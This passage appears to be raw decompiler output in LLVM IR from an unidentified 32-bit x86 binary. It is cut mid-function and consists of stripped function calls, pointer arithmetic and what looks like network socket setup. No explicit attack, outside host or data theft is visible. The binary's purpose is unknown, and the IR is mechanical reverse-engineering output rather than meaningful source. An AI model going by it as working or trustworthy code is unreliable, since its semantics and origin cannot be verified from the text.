  store i32 %v0_805191a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_805192f = trunc i64 %v11_8051910 to i16
  br label %dec_label_pc_805192f

dec_label_pc_8051923:                             ; preds = %dec_label_pc_8051935, %dec_label_pc_805192f
  %v1_8051923 = add i32 %v0_8051923, 1
  store i32 %v1_8051923, i32* %ecx.global-to-local, align 4
  %v1_8051924 = add i32 %v0_8051924, 16
  store i32 %v1_8051924, i32* %eax.global-to-local, align 4
  %v12_8051927 = icmp eq i32 %v1_8051923, %v0_8051906
  br i1 %v12_8051927, label %dec_label_pc_8051a11.loopexit, label %dec_label_pc_805192f

dec_label_pc_805192f:                             ; preds = %dec_label_pc_8051923, %dec_label_pc_805191a
  %v0_8051923 = phi i32 [ %v1_8051923, %dec_label_pc_8051923 ], [ 0, %dec_label_pc_805191a ]
  %v0_8051924 = phi i32 [ %v1_8051924, %dec_label_pc_8051923 ], [ %v0_805191a, %dec_label_pc_805191a ]
  %v3_805192f = add i32 %v0_8051924, 8
  %v4_805192f = inttoptr i32 %v3_805192f to i16*
  %v5_805192f = load i16, i16* %v4_805192f, align 2
  %v11_805192f = icmp ult i16 %v1_805192f, %v5_805192f
  br i1 %v11_805192f, label %dec_label_pc_8051923, label %dec_label_pc_8051935

dec_label_pc_8051935:                             ; preds = %dec_label_pc_805192f
  %v3_8051935 = add i32 %v0_8051924, 10
  %v4_8051935 = inttoptr i32 %v3_8051935 to i16*
  %v5_8051935 = load i16, i16* %v4_8051935, align 2
  %v11_8051935 = icmp ult i16 %v1_805192f, %v5_8051935
  %v1_8051939 = icmp eq i1 %v11_8051935, false
  br i1 %v1_8051939, label %dec_label_pc_8051923, label %dec_label_pc_805193b.loopexit

dec_label_pc_805193b.loopexit:                    ; preds = %dec_label_pc_8051935
  br label %dec_label_pc_805193b

dec_label_pc_805193b:                             ; preds = %dec_label_pc_805193b.loopexit, %dec_label_pc_8051a11
  %v0_805193e = phi i32 [ %v0_8051924, %dec_label_pc_805193b.loopexit ], [ 0, %dec_label_pc_8051a11 ]
  %v0_805193b = load i32, i32* @edi, align 4
  %v1_805193b = add i32 %v0_805193b, 4
  %v2_805193b = inttoptr i32 %v1_805193b to i32*
  %v3_805193b = load i32, i32* %v2_805193b, align 4
  store i32 %v3_805193b, i32* %ecx.global-to-local, align 4
  %v2_805193e = inttoptr i32 %v0_805193b to i32*
  store i32 %v0_805193e, i32* %v2_805193e, align 4
  %v0_8051940 = load i32, i32* @edi, align 4
  %v1_8051940 = add i32 %v0_8051940, 24
  %v2_8051940 = inttoptr i32 %v1_8051940 to i32*
  store i32 0, i32* %v2_8051940, align 4
  %v0_8050f44.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8050f4c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050f44

dec_label_pc_805194c:                             ; preds = %dec_label_pc_80518ab
  %v0_805194f = load i32, i32* @edi, align 4
  %v1_805194f = add i32 %v0_805194f, 4
  %v2_805194f = inttoptr i32 %v1_805194f to i32*
  %v3_805194f = load i32, i32* %v2_805194f, align 4
  store i32 %v3_805194f, i32* %eax.global-to-local, align 4
  %v2_8051952 = add i32 %v0_80518e1, 16
  %v3_8051952 = inttoptr i32 %v2_8051952 to i32*
  store i32 %v3_805194f, i32* %v3_8051952, align 4
  %v1_8051953 = call i32 @function_8052bc1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051953, i32* %eax.global-to-local, align 4
  %v0_805195b = load i32, i32* @edi, align 4
  %v1_805195b = add i32 %v0_805195b, 4
  %v2_805195b = inttoptr i32 %v1_805195b to i32*
  store i32 -1, i32* %v2_805195b, align 4
  %v0_8051962 = load i32, i32* @edi, align 4
  %v1_8051962 = add i32 %v0_8051962, 284
  %v2_8051962 = inttoptr i32 %v1_8051962 to i8*
  store i8 0, i8* %v2_8051962, align 1
  %v0_8051969 = load i32, i32* @edi, align 4
  %v1_8051969 = add i32 %v0_8051969, 12
  %v2_8051969 = inttoptr i32 %v1_8051969 to i32*
  store i32 0, i32* %v2_8051969, align 4
  br label %dec_label_pc_8050f5b

dec_label_pc_8051975:                             ; preds = %dec_label_pc_8050e78
  %v3_8051980 = add nuw nsw i32 %v2_8051980, 1572
  %v4_8051980 = add i32 %v3_8051980, %v0_8051980
  %v5_8051980 = inttoptr i32 %v4_8051980 to i32*
  %v6_8051980 = load i32, i32* %v5_8051980, align 4
  %v9_8051980 = shl i32 1, %v1_805197a
  %v12_8051980 = or i32 %v6_8051980, %v9_8051980
  store i32 %v12_8051980, i32* %v5_8051980, align 4
  %v0_8051988 = load i32, i32* @ebx, align 4
  %v1_8051988 = add i32 %v0_8051988, 4
  %v2_8051988 = inttoptr i32 %v1_8051988 to i32*
  %v3_8051988 = load i32, i32* %v2_8051988, align 4
  store i32 %v3_8051988, i32* %eax.global-to-local, align 4
  %v0_805198b = load i32, i32* @esi, align 4
  %v2_805198b = sub i32 %v0_805198b, %v3_8051988
  %v8_805198b = xor i32 %v0_805198b, %v3_8051988
  %v9_805198b = xor i32 %v2_805198b, %v0_805198b
  %v10_805198b = and i32 %v9_805198b, %v8_805198b
  %v11_805198b = icmp slt i32 %v10_805198b, 0
  %v13_805198b = icmp slt i32 %v2_805198b, 0
  %v2_805198d = icmp eq i1 %v13_805198b, %v11_805198b
  br i1 %v2_805198d, label %dec_label_pc_8050e9b, label %dec_label_pc_8051993

dec_label_pc_8051993:                             ; preds = %dec_label_pc_8051975
  store i32 %v3_8051988, i32* @esi, align 4
  br label %dec_label_pc_8050e9b

dec_label_pc_80519a0:                             ; preds = %dec_label_pc_8050e66
  %v0_80519a0 = load i32, i32* @esp, align 4
  %v1_80519a3 = add i32 %v2_8050e58, 4
  %v2_80519a3 = inttoptr i32 %v1_80519a3 to i32*
  %v3_80519a3 = load i32, i32* %v2_80519a3, align 4
  store i32 %v3_80519a3, i32* %edx.global-to-local, align 4
  %v2_80519a6 = add i32 %v0_80519a0, -16
  %v3_80519a6 = inttoptr i32 %v2_80519a6 to i32*
  store i32 %v3_80519a3, i32* %v3_80519a6, align 4
  %v1_80519a7 = call i32 @function_8052bc1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80519a7, i32* %eax.global-to-local, align 4
  %v0_80519af = load i32, i32* @ebx, align 4
  %v1_80519af = add i32 %v0_80519af, 4
  %v2_80519af = inttoptr i32 %v1_80519af to i32*
  store i32 -1, i32* %v2_80519af, align 4
  %v0_80519b6 = load i32, i32* @ebx, align 4
  %v1_80519b6 = add i32 %v0_80519b6, 12
  %v2_80519b6 = inttoptr i32 %v1_80519b6 to i32*
  %v3_80519b6 = load i32, i32* %v2_80519b6, align 4
  %tmp301 = icmp ult i32 %v3_80519b6, 3
  br i1 %tmp301, label %dec_label_pc_80519ef, label %dec_label_pc_80519bc

dec_label_pc_80519bc:                             ; preds = %dec_label_pc_80519a0
  %v1_80519bc = add i32 %v0_80519b6, 284
  %v2_80519bc = inttoptr i32 %v1_80519bc to i8*
  %v3_80519bc = load i8, i8* %v2_80519bc, align 1
  %v4_80519bc = zext i8 %v3_80519bc to i32
  %v6_80519bc = and i32 %v1_80519a7, -256
  %v7_80519bc = or i32 %v4_80519bc, %v6_80519bc
  %v1_80519c2 = add i32 %v7_80519bc, 1
  %v10_80519c2 = trunc i32 %v1_80519c2 to i8
  store i32 %v1_80519c2, i32* %eax.global-to-local, align 4
  store i8 %v10_80519c2, i8* %v2_80519bc, align 1
  %v0_80519c9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80519c9 = trunc i32 %v0_80519c9 to i8
  %v10_80519c9 = icmp eq i8 %v1_80519c9, 10
  %v0_80519ef.pre = load i32, i32* @ebx, align 4
  br i1 %v10_80519c9, label %dec_label_pc_80519ef, label %dec_label_pc_80519cd

dec_label_pc_80519cd:                             ; preds = %dec_label_pc_80519bc
  store i32 %v0_80519ef.pre, i32* @eax, align 4
  %v0_80519cf = call i32 @function_80501d0()
  store i32 %v0_80519cf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e9b

dec_label_pc_80519e0:                             ; preds = %dec_label_pc_8051821
  %v0_80519e0 = load i32, i32* @edi, align 4
  store i32 %v0_80519e0, i32* @eax, align 4
  store i32 -1, i32* @ebp, align 4
  %v0_80519e5 = call i32 @function_80501d0()
  store i32 %v0_80519e5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051321

dec_label_pc_80519ef:                             ; preds = %dec_label_pc_80519bc, %dec_label_pc_80519a0
  %v0_80519ef = phi i32 [ %v0_80519b6, %dec_label_pc_80519a0 ], [ %v0_80519ef.pre, %dec_label_pc_80519bc ]
  %v1_80519ef = add i32 %v0_80519ef, 284
  %v2_80519ef = inttoptr i32 %v1_80519ef to i8*
  store i8 0, i8* %v2_80519ef, align 1
  %v0_80519f6 = load i32, i32* @ebx, align 4
  %v1_80519f6 = add i32 %v0_80519f6, 12
  %v2_80519f6 = inttoptr i32 %v1_80519f6 to i32*
  store i32 0, i32* %v2_80519f6, align 4
  br label %dec_label_pc_8050e9b

dec_label_pc_8051a02:                             ; preds = %dec_label_pc_8050e48
  br i1 %v5_8050e5d, label %dec_label_pc_8050e9b, label %dec_label_pc_8051a0a

dec_label_pc_8051a0a:                             ; preds = %dec_label_pc_8051a02
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050e66

dec_label_pc_8051a11.loopexit:                    ; preds = %dec_label_pc_8051923
  br label %dec_label_pc_8051a11

dec_label_pc_8051a11:                             ; preds = %dec_label_pc_8051a11.loopexit, %dec_label_pc_80518ed
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805193b

dec_label_pc_8051a18:                             ; preds = %dec_label_pc_805150c
  %v1_8051a18 = add i32 %v0_8050ff7, 56
  %v2_8051a18 = inttoptr i32 %v1_8051a18 to i32*
  %v3_8051a18 = load i32, i32* %v2_8051a18, align 4
  store i32 %v3_8051a18, i32* %eax.global-to-local, align 4
  %v1_8051a1c = inttoptr i32 %v3_8051a18 to i32*
  store i32 104, i32* %v1_8051a1c, align 4
  %v0_8051528.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051528

dec_label_pc_8051a27:                             ; preds = %dec_label_pc_8051528
  store i32 %v0_8051a27, i32* @eax, align 4
  %v0_8051a29 = call i32 @function_80501d0()
  store i32 %v0_8051a29, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f5b

dec_label_pc_8051a33:                             ; preds = %dec_label_pc_80514de
  %v11_8051a33 = icmp eq i8 %v2_80514de, -5
  %v1_8051a35 = icmp eq i1 %v11_8051a33, false
  br i1 %v1_8051a35, label %dec_label_pc_805106d, label %dec_label_pc_8051a3b

dec_label_pc_8051a3b:                             ; preds = %dec_label_pc_8051a33
  store i8 -3, i8* %v1_80514de, align 1
  %v4_805106d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805106d

dec_label_pc_8051a5e:                             ; preds = %dec_label_pc_80512dc
  %v1_8051a5e = add i32 %v0_80512f7, 1
  %v8_8051a5e = icmp eq i32 %v1_8051a5e, 0
  store i32 %v1_8051a5e, i32* %eax.global-to-local, align 4
  br i1 %v8_8051a5e, label %dec_label_pc_8051304, label %dec_label_pc_8051a65

dec_label_pc_8051a65:                             ; preds = %dec_label_pc_8051a5e
  %v0_8051a65 = load i32, i32* @ecx, align 4
  %v1_8051a65 = load i32, i32* @esp, align 4
  %v2_8051a65 = add i32 %v1_8051a65, -4
  %v3_8051a65 = inttoptr i32 %v2_8051a65 to i32*
  store i32 %v0_8051a65, i32* %v3_8051a65, align 4
  %v1_8051a66 = add i32 %v1_8051a65, -8
  %v2_8051a66 = inttoptr i32 %v1_8051a66 to i32*
  store i32 0, i32* %v2_8051a66, align 4
  %v1_8051a68 = add i32 %v1_8051a65, -12
  %v2_8051a68 = inttoptr i32 %v1_8051a68 to i32*
  store i32 1, i32* %v2_8051a68, align 4
  %v1_8051a6a = add i32 %v1_8051a65, -16
  %v2_8051a6a = inttoptr i32 %v1_8051a6a to i32*
  store i32 2, i32* %v2_8051a6a, align 4
  %v3_8051a6c = call i32 @function_80533b5(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_8051a71 = load i32, i32* @esp, align 4
  %v2_8051a71 = add i32 %v1_8051a71, 48
  %v3_8051a71 = inttoptr i32 %v2_8051a71 to i32*
  store i32 %v3_8051a6c, i32* %v3_8051a71, align 4
  %v0_8051a75 = load i32, i32* @esp, align 4
  %v1_8051a78 = add i32 %v3_8051a6c, 1
  %v8_8051a78 = icmp eq i32 %v1_8051a78, 0
  store i32 %v1_8051a78, i32* @eax, align 4
  %v2_8050cbe = inttoptr i32 %v0_8051a75 to i32*
  br i1 %v8_8051a78, label %dec_label_pc_8050cbb, label %dec_label_pc_8051a7f

dec_label_pc_8051a7f:                             ; preds = %dec_label_pc_8051a65
  store i32 18, i32* %v2_8050cbe, align 4
  %v2_8051a84 = call i32 @function_8051cd0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051a84, i32* %eax.global-to-local, align 4
  %v0_8051a89 = load i32, i32* @esp, align 4
  %v1_8051a89 = inttoptr i32 %v0_8051a89 to i32*
  store i32 19, i32* %v1_8051a89, align 4
  %v2_8051a90 = call i32 @function_8051cd0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051a90, i32* %eax.global-to-local, align 4
  %v0_8051a95 = load i32, i32* @esp, align 4
  %v1_8051a95 = inttoptr i32 %v0_8051a95 to i32*
  %v2_8051a95 = load i32, i32* %v1_8051a95, align 4
  store i32 %v2_8051a95, i32* %eax.global-to-local, align 4
  %v3_8051a95 = add i32 %v0_8051a95, 4
  %v1_8051a96 = inttoptr i32 %v3_8051a95 to i32*
  %v2_8051a96 = load i32, i32* %v1_8051a96, align 4
  store i32 %v2_8051a96, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8051a96, align 4
  store i32 18, i32* %v1_8051a95, align 4
  %v3_8051a9b = call i32 @function_8051c20(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8051a9b, i32* %eax.global-to-local, align 4
  %v1_8051aa0 = load i32, i32* @esp, align 4
  %v2_8051aa0 = inttoptr i32 %v1_8051aa0 to i32*
  store i32 %v3_8051a9b, i32* %v2_8051aa0, align 4
  %v2_8051aa3 = call i32 @function_804fd10(i8* bitcast (i32* @0 to i8*))
  store i32 %v2_8051aa3, i32* %eax.global-to-local, align 4
  %v0_8051aa8 = load i32, i32* @esp, align 4
  store i32 %v2_8051aa3, i32* @esi, align 4
  %v2_8051aad = icmp eq i32 %v2_8051aa3, 0
  br i1 %v2_8051aad, label %dec_label_pc_8051304, label %dec_label_pc_8051ab5

dec_label_pc_8051ab5:                             ; preds = %dec_label_pc_8051a7f
  %v1_8051ab5 = add i32 %v0_8051aa8, 1844
  %v2_8051ab5 = inttoptr i32 %v1_8051ab5 to i16*
  store i16 2, i16* %v2_8051ab5, align 2
  %v2_8051abf = add i32 %v2_8051aa3, 4
  %v3_8051abf = inttoptr i32 %v2_8051abf to i32*
  %v4_8051abf = load i32, i32* %v3_8051abf, align 4
  store i32 %v4_8051abf, i32* @ebx, align 4
  %v1_8051ac2 = call i32 @function_804fa40(i32 ptrtoint (i32* @0 to i32))
  %v2_8051ac2 = sext i32 %v1_8051ac2 to i64
  store i32 %v1_8051ac2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8051ac9 = load i32, i32* @esi, align 4
  %v1_8051ac9 = inttoptr i32 %v0_8051ac9 to i8*
  %v2_8051ac9 = load i8, i8* %v1_8051ac9, align 1
  %v3_8051ac9 = zext i8 %v2_8051ac9 to i32
  store i32 %v3_8051ac9, i32* %ecx.global-to-local, align 4
  %v8_8051acf = zext i8 %v2_8051ac9 to i64
  %v9_8051acf = udiv i64 %v2_8051ac2, %v8_8051acf
  %v10_8051acf = trunc i64 %v9_8051acf to i32
  store i32 %v10_8051acf, i32* %eax.global-to-local, align 4
  %v11_8051acf = urem i64 %v2_8051ac2, %v8_8051acf
  %v12_8051acf = trunc i64 %v11_8051acf to i32
  store i32 %v12_8051acf, i32* %edx.global-to-local, align 4
  %v0_8051ad1 = load i32, i32* @ebx, align 4
  %v2_8051ad1 = mul nuw nsw i32 %v12_8051acf, 4
  %v3_8051ad1 = add i32 %v2_8051ad1, %v0_8051ad1
  %v4_8051ad1 = inttoptr i32 %v3_8051ad1 to i32*
  %v5_8051ad1 = load i32, i32* %v4_8051ad1, align 4
  store i32 %v5_8051ad1, i32* %eax.global-to-local, align 4
  %v1_8051ad4 = load i32, i32* @esp, align 4
  %v2_8051ad4 = add i32 %v1_8051ad4, 1832
  %v3_8051ad4 = inttoptr i32 %v2_8051ad4 to i32*
  store i32 %v5_8051ad1, i32* %v3_8051ad4, align 4
  %v0_8051adb = load i32, i32* @edi, align 4
  %v1_8051adb = load i32, i32* @esp, align 4
  %v2_8051adb = add i32 %v1_8051adb, -4
  %v3_8051adb = inttoptr i32 %v2_8051adb to i32*
  store i32 %v0_8051adb, i32* %v3_8051adb, align 4
  %v0_8051adc = load i32, i32* @edi, align 4
  %v2_8051adc = add i32 %v1_8051adb, -8
  %v3_8051adc = inttoptr i32 %v2_8051adc to i32*
  store i32 %v0_8051adc, i32* %v3_8051adc, align 4
  %v1_8051add = add i32 %v1_8051adb, -12
  %v2_8051add = inttoptr i32 %v1_8051add to i32*
  store i32 0, i32* %v2_8051add, align 4
  %v1_8051adf = add i32 %v1_8051adb, -16
  %v2_8051adf = inttoptr i32 %v1_8051adf to i32*
  store i32 19, i32* %v2_8051adf, align 4
  %v3_8051ae1 = call i32 @function_8051c20(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  %v4_8051ae1 = inttoptr i32 %v3_8051ae1 to i16*
  store i32 %v3_8051ae1, i32* %eax.global-to-local, align 4
  %v3_8051ae6 = load i16, i16* %v4_8051ae1, align 2
  %v4_8051ae6 = zext i16 %v3_8051ae6 to i32
  %v7_8051ae6 = and i32 %v3_8051ae1, -65536
  %v8_8051ae6 = or i32 %v4_8051ae6, %v7_8051ae6
  store i32 %v8_8051ae6, i32* %eax.global-to-local, align 4
  %v0_8051ae9 = load i32, i32* @esi, align 4
  %v1_8051ae9 = load i32, i32* @esp, align 4
  %v2_8051ae9 = inttoptr i32 %v1_8051ae9 to i32*
  store i32 %v0_8051ae9, i32* %v2_8051ae9, align 4
  %v0_8051aec = load i32, i32* %eax.global-to-local, align 4
  %v1_8051aec = trunc i32 %v0_8051aec to i16
  %v2_8051aec = load i32, i32* @esp, align 4
  %v3_8051aec = add i32 %v2_8051aec, 1846
  %v4_8051aec = inttoptr i32 %v3_8051aec to i16*
  store i16 %v1_8051aec, i16* %v4_8051aec, align 2
  %v1_8051af4 = call i32 @function_804fcd0(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051af4, i32* %eax.global-to-local, align 4
  %v0_8051af9 = load i32, i32* @esp, align 4
  %v1_8051af9 = inttoptr i32 %v0_8051af9 to i32*
  store i32 18, i32* %v1_8051af9, align 4
  %v2_8051b00 = call i32 @function_8051c50(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051b00, i32* %eax.global-to-local, align 4
  %v0_8051b05 = load i32, i32* @esp, align 4
  %v1_8051b05 = inttoptr i32 %v0_8051b05 to i32*
  store i32 19, i32* %v1_8051b05, align 4
  %v2_8051b0c = call i32 @function_8051c50(i8 ptrtoint (i32* @0 to i8))
  %v0_8051b11 = load i32, i32* @esp, align 4
  %v1_8051b11 = add i32 %v0_8051b11, 1844
  store i32 %v1_8051b11, i32* %eax.global-to-local, align 4
  %v1_8051b1b = add i32 %v0_8051b11, 8
  %v2_8051b1b = inttoptr i32 %v1_8051b1b to i32*
  store i32 16, i32* %v2_8051b1b, align 4
  %v0_8051b1d = load i32, i32* %eax.global-to-local, align 4
  %v2_8051b1d = add i32 %v0_8051b11, 4
  %v3_8051b1d = inttoptr i32 %v2_8051b1d to i32*
  store i32 %v0_8051b1d, i32* %v3_8051b1d, align 4
  %v1_8051b1e = add i32 %v0_8051b11, 48
  %v2_8051b1e = inttoptr i32 %v1_8051b1e to i32*
  %v3_8051b1e = load i32, i32* %v2_8051b1e, align 4
  store i32 %v3_8051b1e, i32* %esi.global-to-local, align 4
  %v3_8051b22 = inttoptr i32 %v0_8051b11 to i32*
  store i32 %v3_8051b1e, i32* %v3_8051b22, align 4
  %v3_8051b23 = call i32 @function_80531da(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8051b28 = load i32, i32* @esp, align 4
  %v1_8051b28 = add i32 %v0_8051b28, 16
  %v1_8051b2b = add i32 %v3_8051b23, 1
  %v8_8051b2b = icmp eq i32 %v1_8051b2b, 0
  store i32 %v1_8051b2b, i32* %eax.global-to-local, align 4
  %v1_8051b2c = icmp eq i1 %v8_8051b2b, false
  br i1 %v1_8051b2c, label %dec_label_pc_8051b47, label %dec_label_pc_8051b2e

dec_label_pc_8051b2e:                             ; preds = %dec_label_pc_8051ab5
  br label %dec_label_pc_8051b31

dec_label_pc_8051b31:                             ; preds = %dec_label_pc_8051b47, %dec_label_pc_8051b2e
  %storemerge4.in = phi i32 [ %v0_8051b28, %dec_label_pc_8051b2e ], [ %v0_8051c0e, %dec_label_pc_8051b47 ]
  %v1_8051b31 = add i32 %storemerge4.in, 48
  %v2_8051b31 = inttoptr i32 %v1_8051b31 to i32*
  %v3_8051b31 = load i32, i32* %v2_8051b31, align 4
  store i32 %v3_8051b31, i32* @edi, align 4
  %v3_8051b35 = inttoptr i32 %storemerge4.in to i32*
  store i32 %v3_8051b31, i32* %v3_8051b35, align 4
  %v1_8051b36 = call i32 @function_8052bc1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051b36, i32* @eax, align 4
  %v0_8051b3b = load i32, i32* @esp, align 4
  %v1_8051b3b = inttoptr i32 %v0_8051b3b to i32*
  store i32 0, i32* %v1_8051b3b, align 4
  %v1_8051b42 = call i32 @function_8054709(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051b42, i32* %eax.global-to-local, align 4
  %v0_8051b47.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051b47

dec_label_pc_8051b47:                             ; preds = %dec_label_pc_8051ab5, %dec_label_pc_8051b31
  %v0_8051b47 = phi i32 [ %v1_8051b28, %dec_label_pc_8051ab5 ], [ %v0_8051b47.pre, %dec_label_pc_8051b31 ]
  %v1_8051b47 = add i32 %v0_8051b47, 1864
  %v2_8051b47 = inttoptr i32 %v1_8051b47 to i8*
  store i8 0, i8* %v2_8051b47, align 1
  %v0_8051b4f = load i32, i32* @esp, align 4
  %v1_8051b4f = add i32 %v0_8051b4f, -4
  %v2_8051b4f = inttoptr i32 %v1_8051b4f to i32*
  store i32 16384, i32* %v2_8051b4f, align 4
  %v1_8051b54 = add i32 %v0_8051b4f, -8
  %v2_8051b54 = inttoptr i32 %v1_8051b54 to i32*
  store i32 1, i32* %v2_8051b54, align 4
  %v1_8051b56 = add i32 %v0_8051b4f, 1864
  store i32 %v1_8051b56, i32* %eax.global-to-local, align 4
  %v2_8051b5d = add i32 %v0_8051b4f, -12
  %v3_8051b5d = inttoptr i32 %v2_8051b5d to i32*
  store i32 %v1_8051b56, i32* %v3_8051b5d, align 4
  %v1_8051b5e = add i32 %v0_8051b4f, 32
  %v2_8051b5e = inttoptr i32 %v1_8051b5e to i32*
  %v3_8051b5e = load i32, i32* %v2_8051b5e, align 4
  store i32 %v3_8051b5e, i32* @ebx, align 4
  %v2_8051b62 = add i32 %v0_8051b4f, -16
  %v3_8051b62 = inttoptr i32 %v2_8051b62 to i32*
  store i32 %v3_8051b5e, i32* %v3_8051b62, align 4
  %v0_8051b63 = call i32 @function_8053304()
  %v0_8051b68 = load i32, i32* @esp, align 4
  %v1_8051b68 = add i32 %v0_8051b68, -4
  %v2_8051b68 = inttoptr i32 %v1_8051b68 to i32*
  store i32 16384, i32* %v2_8051b68, align 4
  %v1_8051b6d = add i32 %v0_8051b68, -8
  %v2_8051b6d = inttoptr i32 %v1_8051b6d to i32*
  store i32 4, i32* %v2_8051b6d, align 4
  %v1_8051b6f = add i32 %v0_8051b68, 1888
  store i32 %v1_8051b6f, i32* %eax.global-to-local, align 4
  %v2_8051b76 = add i32 %v0_8051b68, -12
  %v3_8051b76 = inttoptr i32 %v2_8051b76 to i32*
  store i32 %v1_8051b6f, i32* %v3_8051b76, align 4
  %v1_8051b77 = add i32 %v0_8051b68, 48
  %v2_8051b77 = inttoptr i32 %v1_8051b77 to i32*
  %v3_8051b77 = load i32, i32* %v2_8051b77, align 4
  store i32 %v3_8051b77, i32* %ecx.global-to-local, align 4
  %v2_8051b7b = add i32 %v0_8051b68, -16
  %v3_8051b7b = inttoptr i32 %v2_8051b7b to i32*
  store i32 %v3_8051b77, i32* %v3_8051b7b, align 4
  %v0_8051b7c = call i32 @function_8053304()
  %v0_8051b81 = load i32, i32* @esp, align 4
  %v1_8051b84 = add i32 %v0_8051b81, 28
  %v2_8051b84 = inttoptr i32 %v1_8051b84 to i32*
  store i32 16384, i32* %v2_8051b84, align 4
  %v1_8051b89 = add i32 %v0_8051b81, 24
  %v2_8051b89 = inttoptr i32 %v1_8051b89 to i32*
  store i32 2, i32* %v2_8051b89, align 4
  %v1_8051b8b = add i32 %v0_8051b81, 1914
  store i32 %v1_8051b8b, i32* %eax.global-to-local, align 4
  %v2_8051b92 = add i32 %v0_8051b81, 20
  %v3_8051b92 = inttoptr i32 %v2_8051b92 to i32*
  store i32 %v1_8051b8b, i32* %v3_8051b92, align 4
  %v1_8051b93 = add i32 %v0_8051b81, 64
  %v2_8051b93 = inttoptr i32 %v1_8051b93 to i32*
  %v3_8051b93 = load i32, i32* %v2_8051b93, align 4
  store i32 %v3_8051b93, i32* %edx.global-to-local, align 4
  %v2_8051b97 = add i32 %v0_8051b81, 16
  %v3_8051b97 = inttoptr i32 %v2_8051b97 to i32*
  store i32 %v3_8051b93, i32* %v3_8051b97, align 4
  %v0_8051b98 = call i32 @function_8053304()
  store i32 %v0_8051b98, i32* %eax.global-to-local, align 4
  %v0_8051b9d = load i32, i32* @esp, align 4
  %v1_8051b9d = add i32 %v0_8051b9d, -4
  %v2_8051b9d = inttoptr i32 %v1_8051b9d to i32*
  store i32 16384, i32* %v2_8051b9d, align 4
  %v1_8051ba2 = add i32 %v0_8051b9d, -8
  %v2_8051ba2 = inttoptr i32 %v1_8051ba2 to i32*
  store i32 1, i32* %v2_8051ba2, align 4
  %v1_8051ba4 = add i32 %v0_8051b9d, 52
  %v2_8051ba4 = inttoptr i32 %v1_8051ba4 to i32*
  %v3_8051ba4 = load i32, i32* %v2_8051ba4, align 4
  %v1_8051ba8 = add i32 %v3_8051ba4, 12
  store i32 %v1_8051ba8, i32* %eax.global-to-local, align 4
  %v2_8051bab = add i32 %v0_8051b9d, -12
  %v3_8051bab = inttoptr i32 %v2_8051bab to i32*
  store i32 %v1_8051ba8, i32* %v3_8051bab, align 4
  %v1_8051bac = add i32 %v0_8051b9d, 48
  %v2_8051bac = inttoptr i32 %v1_8051bac to i32*
  %v3_8051bac = load i32, i32* %v2_8051bac, align 4
  store i32 %v3_8051bac, i32* %eax.global-to-local, align 4
  %v2_8051bb0 = add i32 %v0_8051b9d, -16
  %v3_8051bb0 = inttoptr i32 %v2_8051bb0 to i32*
  store i32 %v3_8051bac, i32* %v3_8051bb0, align 4
  %v0_8051bb1 = call i32 @function_8053304()
  %v0_8051bb6 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051bbb = add i32 %v0_8051bb6, 28
  %v2_8051bbb = inttoptr i32 %v1_8051bbb to i32*
  store i32 16384, i32* %v2_8051bbb, align 4
  %v1_8051bc0 = add i32 %v0_8051bb6, 68
  %v2_8051bc0 = inttoptr i32 %v1_8051bc0 to i32*
  %v3_8051bc0 = load i32, i32* %v2_8051bc0, align 4
  store i32 %v3_8051bc0, i32* %edx.global-to-local, align 4
  %v1_8051bc4 = add i32 %v3_8051bc0, 12
  %v2_8051bc4 = inttoptr i32 %v1_8051bc4 to i8*
  %v3_8051bc4 = load i8, i8* %v2_8051bc4, align 1
  %v4_8051bc4 = zext i8 %v3_8051bc4 to i32
  %v5_8051bc4 = load i32, i32* %eax.global-to-local, align 4
  %v6_8051bc4 = and i32 %v5_8051bc4, -256
  %v7_8051bc4 = or i32 %v6_8051bc4, %v4_8051bc4
  store i32 %v7_8051bc4, i32* %eax.global-to-local, align 4
  %v2_8051bc7 = add i32 %v0_8051bb6, 24
  %v3_8051bc7 = inttoptr i32 %v2_8051bc7 to i32*
  store i32 %v7_8051bc4, i32* %v3_8051bc7, align 4
  %v0_8051bc8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051bc8 = inttoptr i32 %v0_8051bc8 to i32*
  %v2_8051bc8 = load i32, i32* %v1_8051bc8, align 4
  store i32 %v2_8051bc8, i32* %eax.global-to-local, align 4
  %v2_8051bca = add i32 %v0_8051bb6, 20
  %v3_8051bca = inttoptr i32 %v2_8051bca to i32*
  store i32 %v2_8051bc8, i32* %v3_8051bca, align 4
  %v1_8051bcb = add i32 %v0_8051bb6, 64
  %v2_8051bcb = inttoptr i32 %v1_8051bcb to i32*
  %v3_8051bcb = load i32, i32* %v2_8051bcb, align 4
  store i32 %v3_8051bcb, i32* %eax.global-to-local, align 4
  %v2_8051bcf = add i32 %v0_8051bb6, 16
  %v3_8051bcf = inttoptr i32 %v2_8051bcf to i32*
